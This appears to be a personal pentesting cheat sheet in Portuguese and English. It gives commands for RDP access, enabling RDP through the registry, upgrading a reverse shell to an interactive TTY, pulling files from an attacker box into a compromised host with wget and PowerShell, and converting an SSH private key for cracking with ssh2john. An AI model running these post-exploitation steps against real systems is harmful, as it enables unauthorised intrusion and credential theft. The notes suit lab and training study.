### RDP

For windows with share and 85% screen

```
rdesktop -u username -p password -g 85% -r disk:share=/root/ 10.10.10.10
```


Para habilitar o acesso RDP:

```shell
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /f
```

Para desabilitar o acesso RDP:

shell

```shell
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 1 /f
```





### Linux

binaries Path

```
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/ucb/
```

###  Interactive Shell

Arrumando interactive TTY using Python

```shell
# Enter while in reverse shell
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
$ stty raw -echo; fg


# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>

```




### File Transfer

#### HTTP

The most common le transfer method.

```shell
# In Kali
python -m SimpleHTTPServer 80

# In reverse shell - Linux
wget 10.10.10.10/file

# In reverse shell - Windows
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.10.10/file.exe','C:\Users\user\Desktop\file.exe')"
```


### Python

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```


## Chave privada cracking

Seguindo a metodologia de cracking, nosso próximo passo é transformar o chave privada em formato hash para nossas ferramentas de cracking. Usaremos o **ssh2john** script de transformação do conjunto JtR e salve o hash resultante para **ssh.hash**.

```shell
kali@kali:~/passwordattacks$ ssh2john id_rsa > ssh.hash

kali@kali:~/passwordattacks$ cat ssh.hash
id_rsa:$sshng$6$16$7059e78a8d3764ea1e883fcdf592feb7$1894$6f70656e7373682d6b65792d7631000000000a6165733235362d6374720000000662637279707400000018000000107059e78a8d3764ea1e883fcdf592feb7000000100000000100000197000000077373682...
```